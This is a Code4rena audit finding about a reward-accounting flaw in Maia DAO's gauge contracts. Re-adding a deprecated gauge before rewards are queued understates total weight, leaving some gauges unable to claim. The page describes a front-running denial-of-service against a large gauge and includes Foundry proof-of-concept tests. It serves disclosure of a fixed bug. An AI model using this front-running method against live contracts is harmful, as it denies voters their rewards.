---
tags:
  - lang/solidity
  - sector/governance
  - sector/token
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - impact/mev/frontrun
protocol: "[[Maia DAO Ecosystem]]"
auditors:
  - "[[Voyvoda]]"
report: "https://code4rena.com/reports/2023-05-maia"
genome:
  - "[[reward-calculation]]"
  - "[[frontrun]]"
  - "[[dos-resistance]]"
  - "[[frontrun-exposure]]"
  - "[[timestamp-dependence]]"
---
# [H-13] Re-adding a deprecated gauge in a new epoch before calling `updatePeriod()`/`queueRewardsForCycle()` will leave some gauges without rewards

- id: 26047
- impact: HIGH
- protocol: [[Maia DAO Ecosystem]]
- reporter: Voyvoda (Code4rena)
- source: https://code4rena.com/reports/2023-05-maia

## Summary


This bug report is regarding a bug found in the code of 0xLightt (Maia) which is a decentralized autonomous organization (DAO). The bug was found in the code of the ERC-20 Gauges, the FlywheelGaugeRewards and the Rewards contracts.

When a gauge is deprecated, its weight is subtracted from the totalWeight; however, the weight of the gauge itself could remain different from 0. This can cause a wrong calculation of the rewards since the totalWeight is less than what it is in reality. This can lead to two areas of concern. First, the last gauge that calls getAccruedRewards() won't receive awards since there will be less rewards than what's recorded in the gauge state. Second, a malicious actor can monitor for when a gauge is re-added and front run getAccruedRewards() for all gauges, except the "whale" and achieving a DOS where the "whale" gauge won't receive the rewards for the epoch.

To address this issue, it is recommended that when a new cycle starts, gauges are re-added after rewards are queued in a cycle. This bug has been confirmed and addressed by 0xLightt (Maia).

## Details


### Lines of code

<https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/erc-20/ERC20Gauges.sol#L174-L181> <br><https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/erc-20/ERC20Gauges.sol#L407-L422> <br><https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/rewards/rewards/FlywheelGaugeRewards.sol#L72-L104>

### Impact

One or more gauges will remain without rewards. A malicious user can DOS a selected gauge from receiving rewards.

### Proof of Concept

When a gauge is deprecated, its weight is subtracted from `totalWeight`; however, the weight of the gauge itself could remain different from 0 (it's up to the users to remove their votes). That's reflected in `_addGauge()`.

```solidity
function _addGauge(address gauge) internal returns (uint112 weight) {
        // some code ... 

        // Check if some previous weight exists and re-add to the total. Gauge and user weights are preserved.
        weight = _getGaugeWeight[gauge].currentWeight;
        if (weight > 0) {
            _writeGaugeWeight(_totalWeight, _add112, weight, currentCycle);
        }

        emit AddGauge(gauge);
    }
```

When `addGauge(...)` is invoked to re-add a gauge that was previously deprecated and still contains votes, `_writeGaugeWeight(...)` is called to add the gauge's weight to `totalWeight`. When the write operation to `totalWeight` is performed during a new cycle, but before `updatePeriod` or `queueRewardsForCycle()` are called, we will have:
- `totalWeight.storedWeight = currentWeight` (the weight before the update),
- `totalWeight.currentWeight = newWeight` (the new weight) and
- `totalWeight.currentCycle = cycle` (the updated new cycle).

The problem is, that when now `queueRewardsForCycle()` is called and subsequently in the call chain `calculateGaugeAllocation(...)` is called (which in turn will request the `totalWeight` through `_getStoredWeight(_totalWeight, currentCycle)`), we will read the old `totalWeight` (i.e. `totalWeight.storedWeight`) because `totalWeight.currentCycle < currentCycle` is false, as the cycle was already updated during the `addGauge(...)` call.

```solidity
function _getStoredWeight(Weight storage gaugeWeight, uint32 currentCycle) internal view returns (uint112) {
        return gaugeWeight.currentCycle < currentCycle ? gaugeWeight.currentWeight : gaugeWeight.storedWeight;
    }
```

This will now cause a wrong calculation of the rewards since we have 1 extra gauge, but the value of `totalWeight` is less than what it is in reality. Therefore, the sum of the rewards among the gauges for the cycle will be more than the total sum allocated by the minter. In other words, the function in the code snippet below will be called for every gauge, including the re-added, but `total` is less than what it has to be.

```solidity
function calculateGaugeAllocation(address gauge, uint256 quantity) external view returns (uint256) {
        if (_deprecatedGauges.contains(gauge)) return 0;
        uint32 currentCycle = _getGaugeCycleEnd();

        uint112 total = _getStoredWeight(_totalWeight, currentCycle);
        uint112 weight = _getStoredWeight(_getGaugeWeight[gauge], currentCycle);
        return (quantity * weight) / total;
    }
```

This can now cause several areas of concern. 

First, in the presented scenario where a gauge is re-added with weight > 0 before`queueRewardsForCycle(...)`, the last gauge (or perhaps the last few gauges, depending on the distribution of weight) among the active gauges that calls `getAccruedRewards()` won't receive awards since there will be less rewards than what's recorded in the gauge state.

Second, in a scenario where we might have several gauges is with a "whale" gauge that holds a majority of votes and therefore, will have a large amount of rewards. A malicious actor can monitor for when a gauge is re-added and front run `getAccruedRewards()` (potentially through `newEpoch()` in `BaseV2Gauge`) for all gauges, except the "whale" and achieving a DOS where the "whale" gauge won't receive the rewards for the epoch. Therefore, the reputation of it will be damaged. This can be done for any gauge, but will have a more significant impact in the case where a lot of voters are denied their awards.

### Coded PoC

**Scenario 1**

Initially, there are 2 gauges with 75%/25% split of the votes. The gauge with 25% of the votes is removed for 1 cycle and then re-added during a new cycle but before queuing of the rewards. The 25% gauge withdraws its rewards and the 75% gauge is bricked and can't withdraw rewards.

Copy the functions `testInitialGauge` & `testDeprecatedAddedGauge` and `helper_gauge_state` in `/test/rewards/rewards/FlywheelGaugeRewardsTest.t.sol`.

Add `import "lib/forge-std/src/console.sol";` to the imports.

Execute with `forge test --match-test testDeprecatedAddedGauge -vv`.

Result: gauge 2 will revert after trying to collect rewards after the 3rd cycle, since gauge 1 was re-added before queuing rewards.

```solidity
function testInitialGauge() public {
        uint256 amount_rewards;
        
        // rewards is 100e18

        // add 2 gauges, 25%/75% split
        gaugeToken.addGauge(gauge1);
        gaugeToken.addGauge(gauge2);
        gaugeToken.incrementGauge(gauge1, 1e18);
        gaugeToken.incrementGauge(gauge2, 3e18);
        
        console.log("--------------Initial gauge state--------------");
        helper_gauge_state();

        // do one normal cycle of rewards
        hevm.warp(block.timestamp + 1000);
        amount_rewards = rewards.queueRewardsForCycle();
        
        console.log("--------------After 1st queueRewardsForCycle state--------------");
        console.log('nextCycleQueuedRewards', amount_rewards);
        helper_gauge_state();
        
        // collect awards
        hevm.prank(gauge1);
        rewards.getAccruedRewards();
        hevm.prank(gauge2);
        rewards.getAccruedRewards();

        console.log("--------------After getAccruedRewards state--------------");
        helper_gauge_state();
    }

    function testDeprecatedAddedGauge() public {
        uint256 amount_rewards;
        // setup + 1 normal cycle
        testInitialGauge();
        // remove gauge
        gaugeToken.removeGauge(gauge1);

        // do one more normal cycle with only 1 gauge
        hevm.warp(block.timestamp + 1000);
        amount_rewards = rewards.queueRewardsForCycle();
        console.log("--------------After 2nd queueRewardsForCycle state--------------");
        console.log('nextCycleQueuedRewards', amount_rewards);
        // examine state
        helper_gauge_state();

        hevm.prank(gauge2);
        rewards.getAccruedRewards();
        console.log("--------------After getAccruedRewards state--------------");
        // examine state
        helper_gauge_state();

        // A new epoch can start for 1 more cycle
        hevm.warp(block.timestamp + 1000);
        
        // Add the gauge back, but before rewards are queued
        gaugeToken.addGauge(gauge1);
        amount_rewards = rewards.queueRewardsForCycle();

        console.log("--------------After 3rd queueRewardsForCycle state--------------");
        // examine state
        console.log('nextCycleQueuedRewards', amount_rewards);
        helper_gauge_state();

        // this is fine
        hevm.prank(gauge1);
        rewards.getAccruedRewards();

        // this reverts
        hevm.prank(gauge2);
        rewards.getAccruedRewards();

        console.log("--------------After getAccruedRewards state--------------");
        // examine state
        helper_gauge_state();

    }
function helper_gauge_state() public view {
        console.log('FlywheelRewards balance', rewardToken.balanceOf(address(rewards)));
        console.log('gaugeCycle', rewards.gaugeCycle());
        address[] memory gs = gaugeToken.gauges();
        for(uint i=0; i<gs.length; i++) {
            console.log('-------------');
            (uint112 prior1, uint112 stored1, uint32 cycle1) = rewards.gaugeQueuedRewards(ERC20(gs[i]));
            console.log("Gauge ",i+1);
            console.log("priorRewards",prior1);
            console.log("cycleRewards",stored1); 
            console.log("storedCycle",cycle1);
        }
        console.log('-------------');
    }
```

**Scenario 2**

Initially, there are 4 gauges with (2e18 | 2e18 | 6e18 | 4e18) votes respectively. The gauge with 4e18 votes is removed for 1 cycle and then re-added during a new cycle but before queuing of the rewards. The 6e18 gauge withdraws its rewards and the 4e18 gauge withdraws its rewards. The two gauges with 2e18 votes are bricked and can't withdraw rewards.

Copy the functions `testInitialGauge2`, `testDeprecatedAddedGauge2` and `helper_gauge_state` in `/test/rewards/rewards/FlywheelGaugeRewardsTest.t.sol`.

Execute with `forge test --match-test testDeprecatedAddedGauge2 -vv`.

Result: the 2 gauges with 2e18 votes will revert after trying to collect rewards.

```solidity
function testInitialGauge2() public {
        uint256 amount_rewards;
        
        // rewards is 100e18
        
        // add 4 gauges, 2x/2x/6x/4x split
        gaugeToken.addGauge(gauge1);
        gaugeToken.addGauge(gauge2);
        gaugeToken.addGauge(gauge3);
        gaugeToken.addGauge(gauge4);

        gaugeToken.incrementGauge(gauge1, 2e18);
        gaugeToken.incrementGauge(gauge2, 2e18);
        gaugeToken.incrementGauge(gauge3, 6e18);
        gaugeToken.incrementGauge(gauge4, 4e18);

        
        console.log("--------------Initial gauge state--------------");
        helper_gauge_state();

        // do one normal cycle of rewards
        hevm.warp(block.timestamp + 1000);
        amount_rewards = rewards.queueRewardsForCycle();
        
        console.log("--------------After 1st queueRewardsForCycle state--------------");
        console.log('nextCycleQueuedRewards', amount_rewards);
        helper_gauge_state();
        
        // collect awards
        hevm.prank(gauge1);
        rewards.getAccruedRewards();
        hevm.prank(gauge2);
        rewards.getAccruedRewards();
        hevm.prank(gauge3);
        rewards.getAccruedRewards();
        hevm.prank(gauge4);
        rewards.getAccruedRewards();

        console.log("--------------After getAccruedRewards state--------------");
        helper_gauge_state();
    }
    function testDeprecatedAddedGauge2() public {
        uint256 amount_rewards;
        // setup + 1 normal cycle
        testInitialGauge2();
        // remove gauge
        gaugeToken.removeGauge(gauge4);

        // do one more normal cycle with only 3 gauges
        hevm.warp(block.timestamp + 1000);
        amount_rewards = rewards.queueRewardsForCycle();
        console.log("--------------After 2nd queueRewardsForCycle state--------------");
        console.log('nextCycleQueuedRewards', amount_rewards);
        // examine state
        helper_gauge_state();

        hevm.prank(gauge1);
        rewards.getAccruedRewards();
        hevm.prank(gauge2);
        rewards.getAccruedRewards();
        hevm.prank(gauge3);
        rewards.getAccruedRewards();
        console.log("--------------After getAccruedRewards state--------------");
        // examine state
        helper_gauge_state();

        // A new epoch can start for 1 more cycle
        hevm.warp(block.timestamp + 1000);
        
        // Add the gauge back, but before rewards are queued
        gaugeToken.addGauge(gauge4);
        amount_rewards = rewards.queueRewardsForCycle();

        console.log("--------------After 3rd queueRewardsForCycle state--------------");
        console.log('nextCycleQueuedRewards', amount_rewards);
        // examine state
        helper_gauge_state();

        // this is fine
        hevm.prank(gauge3);
        rewards.getAccruedRewards();
        
        // this is fine
        hevm.prank(gauge4);
        rewards.getAccruedRewards();

        // this reverts
        hevm.prank(gauge1);
        rewards.getAccruedRewards();
        
        // this reverts, same weight as gauge 1
        hevm.prank(gauge2);
        rewards.getAccruedRewards();

        console.log("--------------After getAccruedRewards state--------------");
        // examine state
        helper_gauge_state();

    }
function helper_gauge_state() public view {
        console.log('FlywheelRewards balance', rewardToken.balanceOf(address(rewards)));
        console.log('gaugeCycle', rewards.gaugeCycle());
        address[] memory gs = gaugeToken.gauges();
        for(uint i=0; i<gs.length; i++) {
            console.log('-------------');
            (uint112 prior1, uint112 stored1, uint32 cycle1) = rewards.gaugeQueuedRewards(ERC20(gs[i]));
            console.log("Gauge ",i+1);
            console.log("priorRewards",prior1);
            console.log("cycleRewards",stored1); 
            console.log("storedCycle",cycle1);
        }
        console.log('-------------');
    }
```

### Recommendation

When a new cycle starts, make sure gauges are re-added after rewards are queued in a cycle.

### Assessed type

Timing

**[0xLightt (Maia) confirmed](https://github.com/code-423n4/2023-05-maia-findings/issues/639#issuecomment-1632915459)**

**[0xLightt (Maia) commented](https://github.com/code-423n4/2023-05-maia-findings/issues/639#issuecomment-1708825650):**
> Addressed [here](https://github.com/Maia-DAO/eco-c4-contest/tree/639).

***
